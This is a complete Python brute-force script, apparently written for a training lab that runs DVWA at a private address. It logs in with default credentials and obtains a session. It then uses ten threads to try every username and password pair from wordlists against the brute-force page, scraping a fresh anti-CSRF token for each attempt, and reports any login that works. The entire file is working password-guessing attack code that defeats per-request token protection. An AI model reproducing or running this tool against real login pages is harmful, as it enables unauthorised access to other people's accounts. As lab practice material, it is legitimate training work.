import requests
import regex as re
import _thread
import sys
from termcolor import cprint
from concurrent.futures import ThreadPoolExecutor



url = "10.10.38.215"
port = "80"
userlist = "./usernames.txt"
passwordlist = "./passlist.txt"
error_message = "Username and/or password incorrect."

lock = _thread.allocate_lock()

def get_session():
    # Get session id from the login page
    r = requests.get("http://{}:{}/login.php".format(url, port))
    phpsessid = re.findall("PHPSESSID=(.*);", r.headers['Set-Cookie'])
    phpsessid = phpsessid[0].split(';')[0]
    difficulty = re.findall("security=(.*);", r.headers['Set-Cookie'])
    difficulty = difficulty[0]

    # Get user_token value from the login page
    token = re.findall("'user_token' value='(.*)'", r.text)[0]

    # Validate the session
    r = requests.post("http://{}:{}/login.php".format(url, port),
                      cookies={'PHPSESSID': phpsessid, 'security': difficulty},
                      data='username=admin&password=password&Login=Login&user_token={}'.format(token),
                      headers={'Content-Type': 'application/x-www-form-urlencoded'})
    return phpsessid


def try_credentials(url, port, username, password, phpsessid):
    lock.acquire()
    sys.stdout.write("\rTry: user={} & password={}".format(username, password))
    r = requests.get("http://{}:{}/vulnerabilities/brute/?username={}&password={}&Login=Login&user_token={}#".format(url, port, username, password, re.findall("'user_token' value='(.*)'", requests.get("http://{}:{}/vulnerabilities/brute/".format(url, port), cookies={'PHPSESSID': phpsessid, 'security': "high"}).text)[0]), cookies={'PHPSESSID': phpsessid, 'security': "high"})
    lock.release()
    if error_message in r.text:
        return;
    lock.acquire()
    cprint("\nFOUND: user='{}' & password='{}'".format(username, password), 'green')
    lock.release()


def main():
    phpsessid = get_session()
    pool = ThreadPoolExecutor(max_workers=10)
    for user in open(userlist, 'r'):
        for password in open(passwordlist, 'r'):
            USER, PASSWORD = user.replace("\n", ''), password.replace("\n", '')
            pool.submit(try_credentials, url, port, USER, PASSWORD, phpsessid)
    pool.shutdown(wait=True)


if __name__ == "__main__":
    main()
